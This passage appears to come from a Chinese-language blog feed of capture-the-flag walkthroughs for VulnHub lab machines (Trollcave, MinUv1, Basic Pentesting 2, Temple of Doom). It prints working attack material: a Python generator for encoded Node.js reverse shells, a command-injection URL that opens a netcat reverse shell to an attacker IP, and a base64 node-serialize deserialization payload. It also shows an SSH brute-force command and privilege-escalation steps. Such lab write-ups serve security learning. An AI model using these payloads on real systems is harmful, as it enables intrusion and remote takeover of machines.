src="/images/2018/10/2018-10-04-18-00-51屏幕截图-300x156.png" /></a></p><h2 id="提权">提权</h2><p>首先还是看/etc/passwd <a href="/images/2018/10/2018-10-04-18-26-16屏幕截图.png"><img src="/images/2018/10/2018-10-04-18-26-16屏幕截图-300x114.png" /></a> 去用户目录看下,在king的目录下看到有个calc <a href="/images/2018/10/2018-10-04-18-27-15屏幕截图.png"><img src="/images/2018/10/2018-10-04-18-27-15屏幕截图-300x246.png" /></a> 发现是个本地的nodejs,curl一下看下 <a href="/images/2018/10/2018-10-04-18-28-08屏幕截图.png"><img src="/images/2018/10/2018-10-04-18-28-08屏幕截图-300x38.png" /></a> 然后审计源码,发现calc里面存在任意代码执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">calc</span>(<span class="params">pathname, request, query, response</span>)</span><br><span class="line">&#123;</span><br><span class="line">    sum = query.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sum)</span><br><span class="line">    response.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    response.<span class="title function_">end</span>(<span class="built_in">eval</span>(sum).<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用到msf的代码加上魔改别人的代码写一个payload生成器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Generator for encoded NodeJS reverse shells</span></span><br><span class="line"><span class="comment"># Based on the NodeJS reverse shell by Evilpacket</span></span><br><span class="line"><span class="comment"># https://github.com/evilpacket/node-shells/blob/master/node_revshell.js</span></span><br><span class="line"><span class="comment"># Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)</span></span><br><span class="line"><span class="comment"># Insecurety Research (2013) - insecurety.net</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span> % (sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">IP_ADDR = sys.argv[<span class="number">1</span>]</span><br><span class="line">PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">charencode</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;String.CharCode&quot;&quot;&quot;</span></span><br><span class="line">    encoded = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encoded = encoded + <span class="string">&quot;,&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(char))</span><br><span class="line">    <span class="keyword">return</span> encoded[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] LHOST = %s&quot;</span> % (IP_ADDR)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] LPORT = %s&quot;</span> % (PORT)</span><br><span class="line">NODEJS_REV_SHELL = <span class="string">&#x27;&#x27;&#x27;(function()&#123; var require = global.require  global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? &quot;cmd&quot; : &quot;/bin/sh&quot;; var net = require(&quot;net&quot;), cp = require(&quot;child_process&quot;), util = require(&quot;util&quot;), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat()&#123; client.socket = net.connect(%s, &quot;%s&quot;, function() &#123; client.socket.pipe(sh.stdin); if (typeof util.pump === &quot;undefined&quot;) &#123; sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); &#125; else &#123; util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); &#125; &#125;); socket.on(&quot;error&quot;, function(error) &#123; counter++; if(counter&lt;= 10)&#123; setTimeout(function() &#123; StagerRepeat();&#125;, 5*1000); &#125; else process.exit(); &#125;); &#125; StagerRepeat(); &#125;)();1+1;&#x27;&#x27;&#x27;</span> % (PORT, IP_ADDR)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Encoding&quot;</span></span><br><span class="line">PAYLOAD = charencode(NODEJS_REV_SHELL)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;eval(String.fromCharCode(%s))&quot;</span> % (PAYLOAD)</span><br></pre></td></tr></table></figure><p>注意后面带上1+1;让服务器有返回 <a href="/images/2018/10/2018-10-04-18-38-43屏幕截图.png"><img src="/images/2018/10/2018-10-04-18-38-43屏幕截图-300x192.png" /></a> 然后拿到shell <a href="/images/2018/10/2018-10-04-18-38-10屏幕截图.png"><img src="/images/2018/10/2018-10-04-18-38-10屏幕截图-300x68.png" /></a> 然后sudo -l发现可以执行任意代码,直接拿到root <a href="/images/2018/10/2018-10-04-18-39-41屏幕截图.png"><img src="/images/2018/10/2018-10-04-18-39-41屏幕截图-300x148.png" /></a> 参考wp:<a href="https://hackso.me/trollcave-1.2-walkthrough/" title="https://hackso.me/trollcave-1.2-walkthrough/">https://hackso.me/trollcave-1.2-walkthrough/</a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透(MinUv1,basic pentesting2)</title>
      <link href="/2018/10/03/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fminuv1/"/>
      <url>/2018/10/03/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fminuv1/</url>
      
        <content type="html"><![CDATA[<h1 id="minuv1">MinUv1</h1><h2 id="介绍">介绍</h2><p><a href="https://www.vulnhub.com/entry/minu-1,235/" title="https://www.vulnhub.com/entry/minu-1,235/">https://www.vulnhub.com/entry/minu-1,235/</a></p><h2 id="ip和端口">ip和端口</h2><p>靶机ip:192.168.1.102 端口情况 <a href="/images/2018/10/2018-10-03-12-59-52屏幕截图.png"><img src="/images/2018/10/2018-10-03-12-59-52屏幕截图-300x125.png" /></a></p><h2 id="代码执行">代码执行</h2><p>去80看下,发现apache的默认配置页面 dirb扫一下,没什么有用的东西,换了个扫目录工具 dirsearch找到一个test.php 然后查看最新页面发现一个类似文件包含的页面 <a href="/images/2018/10/2018-10-03-13-11-09屏幕截图.png"><img src="/images/2018/10/2018-10-03-13-11-09屏幕截图-300x272.png" /></a> 然后发现并不是文件包含,而是任意代码执行.. 他包含源码的方式应该是<code>system('cat xxx')</code>这种 <a href="/images/2018/10/2018-10-03-13-20-24屏幕截图.png"><img src="/images/2018/10/2018-10-03-13-20-24屏幕截图-300x154.png" /></a> 不过似乎有很多命令会失败,这里有人提供了一个网站,里面蛮多命令的利用的,分享一下:<a href="https://gtfobins.github.io/" title="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 然后这里用到busybox</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/test.php?file=index;busybox%20nc%20192.168.1.105%206712%20-e%20sh%20-i</span><br></pre></td></tr></table></figure><p>拿到shell <a href="/images/2018/10/2018-10-03-13-35-13屏幕截图.png"><img src="/images/2018/10/2018-10-03-13-35-13屏幕截图-300x85.png" /></a></p><h2 id="提权">提权</h2><p>看下/etc/passwd,发现了bob用户,到bob的目录看下 <a href="/images/2018/10/2018-10-03-18-20-30屏幕截图.png"><img src="/images/2018/10/2018-10-03-18-20-30屏幕截图-300x118.png" /></a> 看下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/bob $ <span class="built_in">cat</span> ._pw_</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg</span><br></pre></td></tr></table></figure><p>发现是jwt,用<a href="https://github.com/lmammino/jwt-cracker" title="工具">工具</a>解一下 <a href="/images/2018/10/2018-10-03-18-17-33屏幕截图.png"><img src="/images/2018/10/2018-10-03-18-17-33屏幕截图-300x172.png" /></a> 跑了一年跑出来了... 然而电脑里似乎并没有python,不能调用su... 这里就有一个新方法,可以调用script来换用户 <a href="/images/2018/10/2018-10-03-18-39-43屏幕截图.png"><img src="/images/2018/10/2018-10-03-18-39-43屏幕截图-300x146.png" /></a> <a href="/images/2018/10/2018-10-03-18-42-38屏幕截图.png"><img src="/images/2018/10/2018-10-03-18-42-38屏幕截图-300x185.png" /></a></p><h1 id="basic-pentesting2">basic pentesting2</h1><p>蛮有意思的,方法蛮多的</p><h2 id="介绍-1">介绍</h2><p><a href="https://www.vulnhub.com/entry/basic-pentesting-2,241/" title="https://www.vulnhub.com/entry/basic-pentesting-2,241/">https://www.vulnhub.com/entry/basic-pentesting-2,241/</a></p><h2 id="ip和端口-1">ip和端口</h2><p>靶机ip:192.168.1.106 端口情况 <a href="/images/2018/10/2018-10-03-22-44-40屏幕截图.png"><img src="/images/2018/10/2018-10-03-22-44-40屏幕截图-300x117.png" /></a></p><h2 id="getshell">getshell</h2><p>去80端口发现源码里面的注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Undergoing maintenance&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;h4&gt;Please check back later&lt;/h4&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Check our dev note section if you need to know what to work on. --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>扫一下目录 <a href="/images/2018/10/2018-10-03-22-46-05屏幕截图.png"><img src="/images/2018/10/2018-10-03-22-46-05屏幕截图-300x107.png" /></a> 去/development看下 <a href="/images/2018/10/2018-10-03-22-46-54屏幕截图.png"><img src="/images/2018/10/2018-10-03-22-46-54屏幕截图-300x170.png" /></a> 然后拿到两份信息 dev.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2018-04-23: I&#x27;ve been messing with that struts stuff, and it&#x27;s pretty cool! I think it might be neat</span><br><span class="line">to host that on this server too. Haven&#x27;t made any real web apps yet, but I have tried that example</span><br><span class="line">you get to show off how it works (and it&#x27;s the REST version of the example!). Oh, and right now I&#x27;m </span><br><span class="line">using version 2.5.12, because other versions were giving me trouble. -K</span><br><span class="line"></span><br><span class="line">2018-04-22: SMB has been configured. -K</span><br><span class="line"></span><br><span class="line">2018-04-21: I got Apache set up. Will put in our content later. -J</span><br></pre></td></tr></table></figure><p>j.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">For J:</span><br><span class="line"></span><br><span class="line">I&#x27;ve been auditing the contents of /etc/shadow to make sure we don&#x27;t have any weak credentials,</span><br><span class="line">and I was able to crack your hash really easily. You know our password policy, so please follow</span><br><span class="line">it? Change that password ASAP.</span><br><span class="line"></span><br><span class="line">-K</span><br></pre></td></tr></table></figure><p>然后这里学到一种新的探测方法enum4linux <a href="/images/2018/10/2018-10-03-22-49-32屏幕截图.png"><img src="/images/2018/10/2018-10-03-22-49-32屏幕截图-300x132.png" /></a> 然后枚举出username <a href="/images/2018/10/2018-10-03-22-50-54屏幕截图.png"><img src="/images/2018/10/2018-10-03-22-50-54屏幕截图-300x100.png" /></a> 又开了22端口,hydra试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 -f 192.168.1.106 ssh</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-03-23-32-09屏幕截图.png"><img src="/images/2018/10/2018-10-03-23-32-09屏幕截图-300x140.png" /></a></p><h2 id="提权-1">提权</h2><h3 id="官方解">官方解</h3><p>首先登录进去,发现还有一个kay用户 <a href="/images/2018/10/2018-10-04-00-48-56屏幕截图.png"><img src="/images/2018/10/2018-10-04-00-48-56屏幕截图-300x207.png" /></a> 然后我们去kay用户目录看下 <a href="/images/2018/10/2018-10-04-00-49-40屏幕截图.png"><img src="/images/2018/10/2018-10-04-00-49-40屏幕截图-300x140.png" /></a> 发现.ssh,去看一下,发现authorized_keys后面有一句话 <a href="/images/2018/10/2018-10-04-00-51-05屏幕截图.png"><img src="/images/2018/10/2018-10-04-00-51-05屏幕截图-300x51.png" /></a> 尝试私钥登录,但是失败了,要求输入passphrase 所以尝试解pass 复制一份私钥为id_rsa,然后ssh2john用john来破解,然后我这里破解过一次,就直接--show了 <a href="/images/2018/10/2018-10-04-00-57-51屏幕截图.png"><img src="/images/2018/10/2018-10-04-00-57-51屏幕截图-300x66.png" /></a> 登录成功 <a href="/images/2018/10/2018-10-04-01-04-11屏幕截图.png"><img src="/images/2018/10/2018-10-04-01-04-11屏幕截图-300x184.png" /></a> 然后kay目录发现备份密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kay@basic2:~$ <span class="built_in">cat</span> pass.bak </span><br><span class="line">heresareallystrongpasswordthatfollowsthepasswordpolicy$$</span><br></pre></td></tr></table></figure><p>尝试一下sudo -l</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kay@basic2:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> kay on basic2:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User kay may run the following commands on basic2:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure><p>那么就直接<code>sudo bash</code>就好 <a href="/images/2018/10/2018-10-04-01-07-35屏幕截图.png"><img src="/images/2018/10/2018-10-04-01-07-35屏幕截图-300x129.png" /></a></p><h3 id="不知道是不是官方解">不知道是不是官方解</h3><p>suid提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">jan@basic2:/home/kay/.ssh$ find / -perm -4000 -user root 2&gt;/dev/null</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/vim.basic</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br></pre></td></tr></table></figure><p>看到了vim.basic,替换shadow密码就好 <a href="/images/2018/10/2018-10-04-01-25-36屏幕截图.png"><img src="/images/2018/10/2018-10-04-01-25-36屏幕截图-285x300.png" /></a> 然后直接su root就好 <a href="/images/2018/10/2018-10-04-01-26-16屏幕截图.png"><img src="/images/2018/10/2018-10-04-01-26-16屏幕截图-300x122.png" /></a></p><h2 id="弯路">弯路</h2><p>看了8080的manager页面msf爆了一波密码,并没有结果 看到80端口写的struts2.5.12和REST,然后searchsploit找到了漏洞,但是并没有攻击成功... 思路还是开阔点吧...</p><h2 id="后续">后续</h2><p>看了下tomcat的目录,还真的有struts2-rest的目录...不过当时没找到...msf一波带走了... <a href="/images/2018/10/2018-10-04-01-48-35屏幕截图.png"><img src="/images/2018/10/2018-10-04-01-48-35屏幕截图-300x120.png" /></a> 然后manager模块的密码 <a href="/images/2018/10/2018-10-04-01-53-38屏幕截图.png"><img src="/images/2018/10/2018-10-04-01-53-38屏幕截图-300x80.png" /></a> 猜不出来很正常...</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透(temple of doom,toppo)</title>
      <link href="/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/"/>
      <url>/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/</url>
      
        <content type="html"><![CDATA[<h1 id="temple-of-doom">temple of doom</h1><h2 id="介绍">介绍</h2><p><a href="https://www.vulnhub.com/entry/temple-of-doom-1,243/" title="https://www.vulnhub.com/entry/temple-of-doom-1,243/">https://www.vulnhub.com/entry/temple-of-doom-1,243/</a></p><h2 id="ip端口">ip端口</h2><p>靶机ip:192.168.1.102 端口情况: <a href="/images/2018/10/2018-10-02-14-36-53屏幕截图.png"><img src="/images/2018/10/2018-10-02-14-36-53屏幕截图-300x118.png" /></a></p><h2 id="getshell">getshell</h2><p>首先去666端口看一下,发现under construction 刷新一下得到报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SyntaxError: Unexpected token F in JSON at position 79</span><br><span class="line">    at JSON.parse (&lt;anonymous&gt;)</span><br><span class="line">    at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)</span><br><span class="line">    at /home/nodeadmin/.web/server.js:12:29</span><br><span class="line">    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at next (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:137:13)</span><br><span class="line">    at Route.dispatch (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at /home/nodeadmin/.web/node_modules/express/lib/router/index.js:281:22</span><br><span class="line">    at Function.process_params (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:335:12)</span><br><span class="line">    at next (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:275:10)</span><br></pre></td></tr></table></figure><p>注意到重点unserialize,去搜一下nodejs的反序列化漏洞 找到文章<a href="https://paper.seebug.org/213/" title="https://paper.seebug.org/213/">https://paper.seebug.org/213/</a> 按里面的操作生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDU3LDUwLDQ2LDQ5LDU0LDU2LDQ2LDQ5LDQ2LDQ5LDQ4LDUzLDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDU0LDU1LDQ5LDUwLDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKQp9KCkifQ==</span><br></pre></td></tr></table></figure><p>改cookie拿到shell <a href="/images/2018/10/2018-10-02-14-46-46屏幕截图.png"><img src="/images/2018/10/2018-10-02-14-46-46屏幕截图-300x33.png" /></a></p><h2 id="提权">提权</h2><p>传了探测脚本,但是并没有exp有用,卡在这里了 看了一下wp,发现提权其实有点复杂.. 首先在用户目录发现用户fireman 查看一下进程,发现fireman调用了ssmanager</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[nodeadmin@localhost home]$ ps -aux  grep fireman</span><br><span class="line">ps -aux  grep fireman</span><br><span class="line">root       797  0.0  0.4 301464  4316 ?        S    02:26   0:00 su fireman -c /usr/local/bin/ss-manager</span><br><span class="line">fireman    808  0.0  0.3  37060  3736 ?        Ss   02:26   0:00 /usr/local/bin/ss-manager</span><br><span class="line">nodeadm+  1128  0.0  0.1 213788  1040 pts/0    S+   02:50   0:00 grep --color=auto fireman</span><br></pre></td></tr></table></figure><p>searchsploit一下,发现exp <a href="/images/2018/10/2018-10-02-14-57-39屏幕截图.png"><img src="/images/2018/10/2018-10-02-14-57-39屏幕截图-300x58.png" /></a> 看一下,发现要开8839端口,netstat一下,发现开了8839的udp <a 